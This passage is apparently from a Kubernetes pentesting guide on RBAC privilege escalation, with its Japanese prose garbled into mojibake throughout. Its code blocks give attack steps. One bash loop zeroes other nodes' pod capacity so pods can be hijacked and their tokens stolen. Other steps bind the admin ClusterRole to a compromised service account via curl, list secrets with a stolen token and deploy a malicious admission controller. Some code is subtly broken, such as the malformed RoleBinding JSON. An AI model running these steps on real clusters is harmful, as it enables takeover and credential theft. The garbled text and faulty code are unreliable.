2ç•ªç›®ã®æ–¹æ³•ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§K8sã®æ¨©é™ã‚’è­˜åˆ¥ã™ã‚‹ãŸã‚ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹**ï¼ˆGCPã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚‚å«ã‚€ï¼‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚

### serviceaccountsãƒˆãƒ¼ã‚¯ãƒ³ã®ä½œæˆ

`serviceaccounts/token`ã‚’**ä½œæˆã§ãã‚‹ä¸»ä½“**ã¯ã€ç®¡ç†è€…ã¨åŒç­‰ã®SAã®ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ[ã“ã“](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)ã®æƒ…å ±ï¼‰ã€‚

### ephemeralcontainers

**`pods/ephemeralcontainers`**ã‚’**`update`**ã¾ãŸã¯**`patch`**ã§ãã‚‹ä¸»ä½“ã¯ã€ä»–ã®ãƒãƒƒãƒ‰ã§**ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã—ã€ç‰¹æ¨©ã®ã‚ã‚‹securityContextã‚’æŒã¤ephemeralã‚³ãƒ³ãƒ†ãƒŠã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€**ãƒãƒ¼ãƒ‰ã‹ã‚‰è„±å‡º**ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ValidatingWebhookConfigurationsã¾ãŸã¯MutatingWebhookConfigurations

`validatingwebhookconfigurations`ã¾ãŸã¯`mutatingwebhookconfigurations`ã®ã„ãšã‚Œã‹ã«å¯¾ã—ã¦`create`ã€`update`ã€ã¾ãŸã¯`patch`ã®ã„ãšã‚Œã‹ã®å‹•è©ã‚’æŒã¤ä¸»ä½“ã¯ã€ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã™ã‚‹ãŸã‚ã«ãã®ã‚ˆã†ãªwebhookconfigurationsã®1ã¤ã‚’ä½œæˆã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

[`mutatingwebhookconfigurations`ã®ä¾‹ã«ã¤ã„ã¦ã¯ã€ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’å‚ç…§ã—ã¦ãã ã•ã„](./#malicious-admission-controller)ã€‚

### ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª­ã‚€ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ã€[**çµ„ã¿è¾¼ã¿ã®ç‰¹æ¨©ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³é˜²æ­¢**](./#built-in-privileged-escalation-prevention)ã§ã¯ã€ä¸»ä½“ã¯è‡ªèº«ã«æ–°ã—ã„æ¨©é™ã‚’æŒãŸãªã„é™ã‚Šã€ãƒ­ãƒ¼ãƒ«ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã¾ãŸã¯ä½œæˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãŸã ã—ã€**`roles`**ã¾ãŸã¯**`clusterroles`**ã«å¯¾ã™ã‚‹**`escalate`**ã®å‹•è©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã¯é™¤ãã¾ã™ã€‚\
ãã®å ´åˆã€å½¼ã¯è‡ªèº«ã®æ¨©é™ã‚ˆã‚Šã‚‚å„ªã‚ŒãŸæ¨©é™ã‚’æŒã¤æ–°ã—ã„ãƒ­ãƒ¼ãƒ«ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°/ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒãƒ¼ãƒ‰ãƒ—ãƒ­ã‚­ã‚·

**`nodes/proxy`**ã®ã‚µãƒ–ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ä¸»ä½“ã¯ã€Kubelet APIã‚’ä»‹ã—ã¦ãƒãƒƒãƒ‰ä¸Šã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼ˆ[ã“ã“](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)ã«ã‚ˆã‚‹ã¨ï¼‰ã€‚Kubeletã®èªè¨¼ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**ã“ã“ã§Kubelet APIã«èªè¨¼ã•ã‚ŒãŸçŠ¶æ…‹ã§RCEã‚’å–å¾—ã™ã‚‹ä¾‹**](../pentesting-kubernetes-services.md#kubelet-rce)ã‚’ã”è¦§ã„ãŸã ã‘ã¾ã™ã€‚

### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ãªãƒãƒ¼ãƒ‰

**ãƒãƒƒãƒ‰ã‚’å‰Šé™¤**ï¼ˆ`pods`ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹`delete`å‹•è©ï¼‰ã€**ãƒãƒƒãƒ‰ã‚’è¿½ã„å‡ºã™**ï¼ˆ`pods/eviction`ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹`create`å‹•è©ï¼‰ã€ã¾ãŸã¯**ãƒãƒƒãƒ‰ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’å¤‰æ›´**ï¼ˆ`pods/status`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã§ãã€**ä»–ã®ãƒãƒ¼ãƒ‰ã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ã«ã™ã‚‹**ï¼ˆ`nodes/status`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã‹**ãƒãƒ¼ãƒ‰ã‚’å‰Šé™¤**ï¼ˆ`nodes`ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹`delete`å‹•è©ï¼‰ã—ã€ãƒãƒƒãƒ‰ã‚’åˆ¶å¾¡ã§ãã‚‹ä¸»ä½“ã¯ã€ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒãƒƒãƒ‰ã‚’**å¥ªã„å–ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ã‚ˆã†ãªãƒãƒƒãƒ‰ã¯**ä¾µå®³ã•ã‚ŒãŸãƒãƒ¼ãƒ‰**ã§å®Ÿè¡Œã•ã‚Œã€æ”»æ’ƒè€…ã¯ãã‚Œã‚‰ã®ãƒãƒƒãƒ‰ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ã‚µãƒ¼ãƒ“ã‚¹ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ï¼ˆCVE-2020-8554ï¼‰

**`services/status`** ã‚’**å¤‰æ›´**ã§ãã‚‹ä¸»ä½“ã¯ã€**ä¿®æ­£ã•ã‚Œã¦ã„ãªã„CVE-2020-8554**ã‚’æ‚ªç”¨ã—ã€ã‚¯ãƒ©ã‚¹ã‚¿ã«å¯¾ã—ã¦**MiTMæ”»æ’ƒã‚’å®Ÿè¡Œ**ã™ã‚‹ãŸã‚ã«`status.loadBalancer.ingress.ip`ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚CVE-2020-8554ã®ã»ã¨ã‚“ã©ã®ç·©å’Œç­–ã¯ã€ExternalIPã‚µãƒ¼ãƒ“ã‚¹ã®ã¿ã‚’é˜²æ­¢ã—ã¾ã™ï¼ˆ[**ã“ã¡ã‚‰**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)ã‚’å‚ç…§ï¼‰ã€‚

### ãƒãƒ¼ãƒ‰ã¨ãƒãƒƒãƒ‰ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹

**`nodes/status`** ã¾ãŸã¯ **`pods/status`** ã®**`update`**ã¾ãŸã¯**`patch`**æ¨©é™ã‚’æŒã¤ä¸»ä½“ã¯ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒªãƒ³ã‚°åˆ¶ç´„ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãŸã‚ã«ãƒ©ãƒ™ãƒ«ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## çµ„ã¿è¾¼ã¿ç‰¹æ¨©æ˜‡æ ¼é˜²æ­¢

å±é™ºãªæ¨©é™ãŒå­˜åœ¨ã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€Kubernetesã¯ç‰¹æ¨©æ˜‡æ ¼ã®å¯èƒ½æ€§ãŒã‚ã‚‹ä»–ã®ã‚¿ã‚¤ãƒ—ã®æ¨©é™ã‚’é˜²æ­¢ã™ã‚‹ãŸã‚ã«è‰¯ã„ä»•äº‹ã‚’ã—ã¦ã„ã¾ã™ã€‚

Kubernetesã«ã¯ã€[çµ„ã¿è¾¼ã¿ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)ãŒã‚ã‚Šã¾ã™ã€‚

> RBAC APIã¯ã€ãƒ­ãƒ¼ãƒ«ã¾ãŸã¯ãƒ­ãƒ¼ãƒ«ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚’ç·¨é›†ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç‰¹æ¨©ã®æ˜‡æ ¼ã‚’é˜²æ­¢ã—ã¾ã™ã€‚ã“ã‚Œã¯APIãƒ¬ãƒ™ãƒ«ã§å¼·åˆ¶ã•ã‚Œã‚‹ãŸã‚ã€RBACèªå¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã§ã‚‚é©ç”¨ã•ã‚Œã¾ã™ã€‚
>
> ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ãƒ­ãƒ¼ãƒ«ã«å«ã¾ã‚Œã‚‹ã™ã¹ã¦ã®æ¨©é™ã‚’æ—¢ã«æŒã£ã¦ã„ã‚‹å ´åˆã«ã®ã¿ã€ãƒ­ãƒ¼ãƒ«ã‚’ä½œæˆ/æ›´æ–°ã§ãã¾ã™ã€‚ãƒ­ãƒ¼ãƒ«ã¨åŒã˜ã‚¹ã‚³ãƒ¼ãƒ—ï¼ˆClusterRoleã®å ´åˆã¯ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã€Roleã®å ´åˆã¯åŒã˜åå‰ç©ºé–“ã¾ãŸã¯ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ï¼‰ã§ã€‚

{% hint style="warning" %}
å‰ã®ãƒ«ãƒ¼ãƒ«ã«ã¯ä¾‹å¤–ãŒã‚ã‚Šã¾ã™ã€‚ä¸»ä½“ãŒ**`roles`**ã¾ãŸã¯**`clusterroles`**ã«å¯¾ã—ã¦**`escalate`**å‹•è©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€å½¼ã¯è‡ªèº«ã«æ¨©é™ãŒãªãã¦ã‚‚ãƒ­ãƒ¼ãƒ«ã¨ã‚¯ãƒ©ã‚¹ã‚¿ãƒ­ãƒ¼ãƒ«ã®ç‰¹æ¨©ã‚’å¢—ã‚„ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

ã“ã®ã‚ˆã†ãªé˜²æ­¢ç­–ã®ä¾‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆåãŒ_sa7_ã§ã€RoleBinding _edit-role-rolebinding_ã«å­˜åœ¨ã—ã¾ã™ã€‚ã“ã®RoleBindingã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ã€_edit-role_ã¨ã„ã†åå‰ã®ãƒ­ãƒ¼ãƒ«ãŒã‚ã‚Šã€_default_åå‰ç©ºé–“ã®**ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«ã«å¯¾ã—ã¦å®Œå…¨ãªæ¨©é™ãƒ«ãƒ¼ãƒ«**ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ç†è«–çš„ã«ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯_default_åå‰ç©ºé–“ã®**ä»»æ„ã®ãƒ­ãƒ¼ãƒ«**ã‚’**ç·¨é›†**ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

ã¾ãŸã€_list-pods_ã¨ã„ã†æ—¢å­˜ã®ãƒ­ãƒ¼ãƒ«ã‚‚å­˜åœ¨ã—ã¾ã™ã€‚ã“ã®ãƒ­ãƒ¼ãƒ«ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯_default_åå‰ç©ºé–“ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼_sa7_ã¯ä»»æ„ã®ãƒ­ãƒ¼ãƒ«ã‚’ç·¨é›†ã™ã‚‹æ¨©é™ã‚’æŒã¤ã¯ãšãªã®ã§ã€ãƒ­ãƒ¼ãƒ«ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã€Œsecretsã€ãƒªã‚½ãƒ¼ã‚¹ã‚’è¿½åŠ ã—ã‚ˆã†ã¨ã—ãŸå ´åˆã«ä½•ãŒèµ·ã“ã‚‹ã‹è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

ãã†ã™ã‚‹ã¨ã€ã€Œforbidden: attempt to grant extra privilegesã€ã¨ã„ã†ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼ˆå›³31ï¼‰ã€‚ãªãœãªã‚‰ã€_sa7_ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã®ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ãŸã‚ã€è‡ªèº«ã«æ¨©é™ãŒã‚ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã®ã¿ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **RoleBindings/ClusterRoleBindingsã®å–å¾—ã¨ãƒ‘ãƒƒãƒ**

{% hint style="danger" %}
**ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ä»¥å‰ã¯æ©Ÿèƒ½ã—ã¦ã„ãŸã‚ˆã†ã§ã™ãŒã€ç§ã®ãƒ†ã‚¹ãƒˆã«ã‚ˆã‚‹ã¨ã€å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ãŸç†ç”±ã¨åŒã˜ãã€ã‚‚ã¯ã‚„æ©Ÿèƒ½ã—ã¦ã„ã¾ã›ã‚“ã€‚è‡ªåˆ†è‡ªèº«ã¾ãŸã¯åˆ¥ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ãŸã‚ã«ã€æ—¢ã«ãã‚Œã‚’æŒã£ã¦ã„ãªã„å ´åˆã€ãƒ­ãƒ¼ãƒ«ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚**
{% endhint %}

Rolebindingsã‚’ä½œæˆã™ã‚‹ç‰¹æ¨©ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒ­ãƒ¼ãƒ«ã‚’ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã®ç‰¹æ¨©ã¯ã€**ã‚³ãƒ³ãƒ—ãƒ­ãƒŸã‚¹ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ç®¡ç†è€…ç‰¹æ¨©ã‚’ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

æ¬¡ã®ClusterRoleã¯ã€ç‰¹åˆ¥ãªå‹•è©_bind_ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ_admin_ ClusterRoleï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®é«˜ç‰¹æ¨©ãƒ­ãƒ¼ãƒ«ï¼‰ã‚’æŒã¤RoleBindingã‚’ä½œæˆã—ã€ã“ã®admin ClusterRoleã«è‡ªèº«ã‚’å«ã‚€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

ãã®å¾Œã€**`malicious-RoleBinging.json`**ã‚’ä½œæˆã—ã€**ç®¡ç†è€…ãƒ­ãƒ¼ãƒ«ã‚’ä»–ã®ã‚³ãƒ³ãƒ—ãƒ­ãƒŸã‚¹ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒã‚¤ãƒ³ãƒ‰**ã—ã¾ã™ã€‚
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
ã“ã®JSONãƒ•ã‚¡ã‚¤ãƒ«ã®ç›®çš„ã¯ã€ç®¡ç†è€…ã®ã€ŒClusterRoleã€ï¼ˆ11è¡Œç›®ï¼‰ã‚’ä¾µå®³ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆ16è¡Œç›®ï¼‰ã«ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚

ã•ã¦ã€æ¬¡ã«ã€ä»¥ä¸‹ã®CURLã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦JSONã‚’APIã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦é€ä¿¡ã™ã‚‹ã ã‘ã§ã™ã€‚
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
**adminãƒ­ãƒ¼ãƒ«ãŒã€Œcompromised-svcã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚ŒãŸå¾Œã€ç§ãŸã¡ã¯ä¾µå®³ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®CURLã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚**

```bash
curl -H "Authorization: Bearer <compromised_token>" https://api.example.com/secrets
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€`compromised_token`ã¨ã„ã†ä¾µå®³ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€`https://api.example.com/secrets`ã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## ãã®ä»–ã®æ”»æ’ƒ

### ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ãƒ—ãƒ­ã‚­ã‚·ã‚¢ãƒ—ãƒª

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒãƒƒãƒ‰é–“ã®é€šä¿¡ã«ã¯æš—å·åŒ–ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ç›¸äº’èªè¨¼ã€åŒæ–¹å‘ã€ãƒãƒƒãƒ‰é–“ã®é€šä¿¡ã«ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

#### ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ãƒ—ãƒ­ã‚­ã‚·ã‚¢ãƒ—ãƒªã®ä½œæˆ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

ã‚ãªãŸã®.yamlãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¦ãã ã•ã„ã€‚
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
ã‚ãªãŸã® .yaml ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã—ã€ã‚³ãƒ¡ãƒ³ãƒˆã‚¢ã‚¦ãƒˆã•ã‚ŒãŸè¡Œã‚’è¿½åŠ ã—ã¦ãã ã•ã„ã€‚
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
ãƒ—ãƒ­ã‚­ã‚·ã®ãƒ­ã‚°ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š
```bash
kubectl logs app -C proxy
```
è©³ç´°ã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©

ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®æ°¸ç¶šåŒ–ã®å‰ã«Kubernetes APIã‚µãƒ¼ãƒãƒ¼ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ã‚»ãƒ—ãƒˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã®ä¸€éƒ¨ã§ã™ãŒã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒèªè¨¼ã•ã‚ŒãŸå¾Œã§ã‚ã‚Šã€æ‰¿èªã•ã‚ŒãŸå¾Œã§ã™ã€‚

æ”»æ’ƒè€…ãŒä½•ã‚‰ã‹ã®æ–¹æ³•ã§ã€ŒMutationg Adminssion Controllerã€ã‚’æ³¨å…¥ã§ãã‚Œã°ã€æ—¢ã«èªè¨¼ã•ã‚ŒãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ç‰¹æ¨©æ˜‡æ ¼ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§ã®æ°¸ç¶šåŒ–ãªã©ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

ä¾‹ï¼š[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
å¾…ã£ã¦ãã ã•ã„ã€‚Webhookã‚µãƒ¼ãƒãƒ¼ãŒæº–å‚™å®Œäº†ã™ã‚‹ã¾ã§ãŠå¾…ã¡ãã ã•ã„ã€‚ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

æ‚ªæ„ã®ã‚ã‚‹å¤‰ç•°ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’å±•é–‹ã—ã¾ã—ã‚‡ã†ã€‚
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
å¾…ã£ã¦ã€ãƒãƒƒãƒ‰ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãŒå¤‰ã‚ã‚‹ã®ã‚’ç¢ºèªã™ã‚‹ã¾ã§å†åº¦ãŠå¾…ã¡ãã ã•ã„ã€‚ä»Šã€`ErrImagePull` ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚ã©ã¡ã‚‰ã‹ã®ã‚¯ã‚¨ãƒªã§ã‚¤ãƒ¡ãƒ¼ã‚¸åã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

